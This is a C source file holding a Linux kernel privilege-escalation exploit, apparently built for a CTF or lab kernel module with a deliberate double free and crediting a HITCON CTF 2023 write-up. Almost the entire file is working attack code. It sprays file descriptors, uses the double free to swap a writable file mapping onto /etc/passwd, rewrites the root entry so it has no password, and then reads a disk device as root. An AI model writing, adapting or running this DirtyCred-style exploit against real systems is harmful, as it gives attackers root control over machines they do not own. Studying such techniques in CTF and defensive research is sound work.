#include <unistd.h>
#include "libs/pwn.h"

#define FS_CONTEXT_SIZE 256
#define NUM_SPRAY_FDS 0x300

/*
 * inspired by https://chovid99.github.io/posts/hitcon-ctf-2023/
 */

int main(void)
{

  int tmp_a;
  int freed_fd = -1;
  void* keap_ptr;
  char buf[FS_CONTEXT_SIZE];
  bzero(buf, sizeof(buf));

  puts("[+] Initial setup");

  rlimit_increase(RLIMIT_NOFILE);

  // Pin CPU
  pin_cpu(0, 0);

  init();

  // create target file
  tmp_a = SYSCHK(open("/tmp/a", O_RDWR | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR));
  SYSCHK(close(tmp_a));

  puts("[+] create and free heap allocation for double free later");
  keap_ptr = keap_malloc(FS_CONTEXT_SIZE, GFP_KERNEL_ACCOUNT);

  keap_free(keap_ptr);
  // spray 

  /*******************************
   * DIRTY CRED                  *
   *******************************/

  puts("=======================");
  puts("[+] Start the main exploit");

  puts("[+] Spray FDs");
  int spray_fds[NUM_SPRAY_FDS];
  for(int i =0;i<NUM_SPRAY_FDS;i++){
    spray_fds[i] = open("/tmp/a", O_RDWR); // /tmp/a is a writable file
    if (spray_fds[i] == -1) {
      puts("Failed to open FDs");
      return EXIT_FAILURE;
    }
  }

  puts("[+] Free one of the FDs via double free keap");
  keap_read(buf, keap_ptr, FS_CONTEXT_SIZE);
  #ifdef DEBUG
  print_hex(buf, FS_CONTEXT_SIZE); 
  #endif
  keap_free(keap_ptr);
  // After: 1 fd but pointed chunk is free

  // Spray to replace the previously freed chunk
  // Set the lseek to 0x8, so that we can find easily the fd
  puts("[+] Find the freed FD using lseek");
  int spray_fds_2[NUM_SPRAY_FDS];
  for (int i = 0; i < NUM_SPRAY_FDS; i++) {
    spray_fds_2[i] = open("/tmp/a", O_RDWR);
    lseek(spray_fds_2[i], 0x8, SEEK_SET);
  }
  // After: 2 fd 1 refcount (Because new file)

  // The freed fd will have lseek value set to 0x8. Try to find it.
  for (int i = 0; i < NUM_SPRAY_FDS; i++) {
    if (lseek(spray_fds[i], 0 ,SEEK_CUR) == 8) {
      freed_fd = spray_fds[i];
      lseek(freed_fd, 0x0, SEEK_SET);
      printf("[+] Found freed fd: %d\n", freed_fd);
      break;
    }
  }

  keap_read(buf, keap_ptr, FS_CONTEXT_SIZE);
  #ifdef DEBUG
  print_hex(buf, FS_CONTEXT_SIZE); 
  #endif

  if (freed_fd == -1) {
    puts("Failed to find FD");
    return EXIT_FAILURE;
  }

  // mmap trick instead of race with write
  puts("[+] DirtyCred via mmap");
  char *file_mmap = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, freed_fd, 0);
  // After: 3 fd 2 refcount (Because new file)

  close(freed_fd);
  // After: 2 fd 1 refcount (Because new file)

  for (int i = 0; i < NUM_SPRAY_FDS; i++) {
      close(spray_fds_2[i]);
  }
  // After: 1 fd 0 refcount (Because new file)
  // Effect: FD in mmap (which is writeable) can be replaced with RDONLY file

  for (int i = 0; i < NUM_SPRAY_FDS; i++) {
      spray_fds[i] = open("/etc/passwd", O_RDONLY);
  }
  // After: 2 fd 1 refcount (but writeable due to mmap)
  keap_read(buf, keap_ptr, FS_CONTEXT_SIZE);
  #ifdef DEBUG
  print_hex(buf, FS_CONTEXT_SIZE); 
  #endif

  strcpy(file_mmap, "root::0:0:root:/root:/bin/sh\n");
  puts("[+] Finished! Reading Flag");
  puts("=======================");
  system("su -c 'cat /dev/sda'");
  return 0;
}
